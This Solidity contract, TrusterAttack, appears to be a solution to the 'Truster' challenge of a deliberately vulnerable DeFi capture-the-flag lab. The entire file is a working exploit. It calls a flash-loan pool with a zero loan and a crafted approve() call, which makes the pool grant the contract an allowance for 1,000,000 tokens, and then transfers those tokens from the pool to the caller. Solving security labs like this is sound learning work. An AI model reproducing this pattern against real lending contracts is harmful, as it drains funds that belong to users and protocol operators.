// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttack {

  constructor(address _token, address _pool) {
    IERC20 damnValuableToken = IERC20(_token);
    TrusterLenderPool pool = TrusterLenderPool(_pool);

    pool.flashLoan(
      0 ether, 
      address(address(this)), 
      address(damnValuableToken), 
      abi.encodeWithSignature(
        "approve(address,uint256)", 
        address(this), 
        1000000 ether
      )
    );
    damnValuableToken.transferFrom(address(pool), msg.sender, 1000000 ether);
  }

}